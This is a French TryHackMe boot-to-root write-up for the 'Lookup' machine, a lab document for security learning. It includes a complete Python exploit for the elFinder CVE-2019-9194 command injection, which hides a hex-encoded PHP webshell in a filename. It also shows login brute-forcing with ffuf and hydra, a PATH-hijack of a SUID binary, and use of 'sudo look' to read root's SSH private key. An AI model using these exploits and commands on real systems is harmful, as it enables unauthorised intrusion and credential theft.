# LOOKUP — TryHackMe Boot-to-Root Writeup

**Difficulté :** Facile

---

##  Objectif

> "Lookup" est une machine boot-to-root qui met en pratique la reconnaissance, l'énumération de sous-domaines, l'exploitation d'une injection de commande dans elFinder, et l'élévation de privilèges via des binaires SUID mal configurés.

---

##  Reconnaissance

- **Ports ouverts :** 22 (SSH), 80 (HTTP)
- **Nom de domaine :** `lookup.thm`
- **Formulaire de login :** `http://lookup.thm/login.php`

Ajout dans `/etc/hosts` :
```text
10.80.179.18 files.lookup.thm www.lookup.thm lookup.thm
```

---

## Fuzzing des noms d'utilisateur

```bash
ffuf -w ../wordlists/xato-net-10-million-usernames.txt -X POST \
  -u http://lookup.thm/login.php \
  -d "username=FUZZ&password=pwned" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 74
```

**Résultat :**
```text
admin   [Status: 200, Size: 62, Words: 8, Lines: 1]
jose    [Status: 200, Size: 62, Words: 8, Lines: 1]
```

---

##  Fuzzing du mot de passe pour `jose`

```bash
ffuf -w ../wordlists/xato-net-10-million-usernames.txt -X POST \
  -u http://lookup.thm/login.php \
  -d "username=jose&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 74
```

**Résultat :**
```text
jose    [Status: 302, Size: 0, Words: 1, Lines: 1]
```

**Identifiants valides :** `jose:password123`

---

##  Exploration des fichiers

Après connexion, on accède à un gestionnaire de fichiers **elFinder** avec de nombreux fichiers aux noms aléatoires (`swaddle`, `throbbed`, `rycca`, etc.).

**Version d'elFinder :**
- elFinder 2.1.47
- Protocole 2.1047
- jQuery UI 3.3.1 / 1.12.1

**Vulnérabilité :** CVE-2019-9194 — injection de commande dans le connecteur PHP.

---

##  Exploitation (CVE-2019-9194)

Metasploit (`exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`) a été testé mais a échoué à cause de la taille du payload (sessions Meterpreter qui meurent immédiatement). Un exploit Python personnalisé a donc été utilisé.

### Script d'exploitation (`exploit.py`)

```python
#!/usr/bin/env python3

import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py [URL]")
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid": "1693222c439f4", "cmd": "upload", "target": "l1_Lw", "mtime[]": "1497726174"}
    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
    return r.text

def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    if r.status_code == 200:
        print("[+] Pwned! :)")
        print("[+] Getting the shell...")
        while True:
            try:
                cmd = input("$ ")
                r = requests.get("%s/php/SecSignal.php?c=%s" % (url, cmd))
                print(r.text)
            except KeyboardInterrupt:
                sys.exit("\nBye kaker!")
    else:
        print("[*] The site seems not to be vulnerable :(")

def main():
    usage()
    url = sys.argv[1]
    print("[*] Uploading the malicious image...")
    h = upload(url, payload)
    print("[*] Running the payload...")
    imgRotate(url, h)
    shell(url)

if __name__ == "__main__":
    main()
```

**Exécution :**
```bash
python3 exploit.py http://files.lookup.thm/elFinder
```

**Résultat :** shell en tant que `www-data`.

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

##  Énumération en tant que `www-data`

```bash
ls -la /home/think/
```

On remarque un fichier `.passwords` (lisible par le groupe `think`, mais pas par `www-data`), et un binaire SUID intéressant : `/usr/sbin/pwm`.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Liste non exhaustive :
```text
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/sudo
...
```

---

## Élévation de privilèges vers `think` (via `pwm`)

`pwm` exécute la commande `id` sans chemin absolu. En plaçant un faux `id` dans `/tmp` et en modifiant le `PATH`, on peut tromper `pwm` pour qu'il croie que nous sommes `think` et affiche son fichier `.passwords`.

**Création du faux `id` via base64 (pour éviter les problèmes d'encodage) :**

```bash
curl -s -G 'http://files.lookup.thm/elFinder/php/SecSignal.php' \
  --data-urlencode 'c=echo IyEvYmluL2Jhc2gKZWNobyAidWlkPTEwMDAodGhpbmspIGdpZD0xMDAwKHRoaW5rKSBncm91cHM9MTAwMCh0aGluaykiCg== | base64 -d > /tmp/id'

curl -s -G 'http://files.lookup.thm/elFinder/php/SecSignal.php' \
  --data-urlencode 'c=chmod +x /tmp/id'

curl -s -G 'http://files.lookup.thm/elFinder/php/SecSignal.php' \
  --data-urlencode 'c=PATH=/tmp:$PATH /usr/sbin/pwm'
```

**Résultat :**
```text
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
...
```

On sauvegarde cette liste dans `password.txt`.

---

##  Brute force SSH

```bash
hydra -l think -P password.txt ssh://10.80.179.18
```

**Résultat :**
```text
[22][ssh] host: 10.80.179.18   login: think   password: josemario.AKA(think)
```

---

##  Flag utilisateur

```bash
ssh think@10.80.179.18
cat /home/think/user.txt
```

**Flag utilisateur :** `REDACTED`

---

## ⬆️ Élévation de privilèges vers root

```bash
sudo -l
```

```text
User think may run the following commands on ip-10-80-179-18:
    (ALL) /usr/bin/look
```

`look` peut lire n'importe quel fichier en tant que root. On l'utilise pour lire la clé SSH privée de root :

```bash
sudo /usr/bin/look '' /root/.ssh/id_rsa
```

**Résultat :**
```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

On copie la clé dans un fichier `id_rsa` local, on applique `chmod 600 id_rsa`, puis on se connecte :

```bash
ssh root@10.80.179.18 -i id_rsa
```

**Flag root :**
```bash
cat /root/root.txt
```

**Flag root :** `REDACTED`

---

##  Résumé des vulnérabilités exploitées

| Étape | Vulnérabilité |
|-------|---------------|
| Web | CVE-2019-9194 — injection de commande dans elFinder 2.1.47 |
| Privesc (www-data → think) | Binaire SUID `pwm` exécutant `id` sans chemin absolu → PATH hijacking |
| Privesc (think → root) | `sudo look` permettant de lire des fichiers arbitraires (clé SSH privée de root) |

---


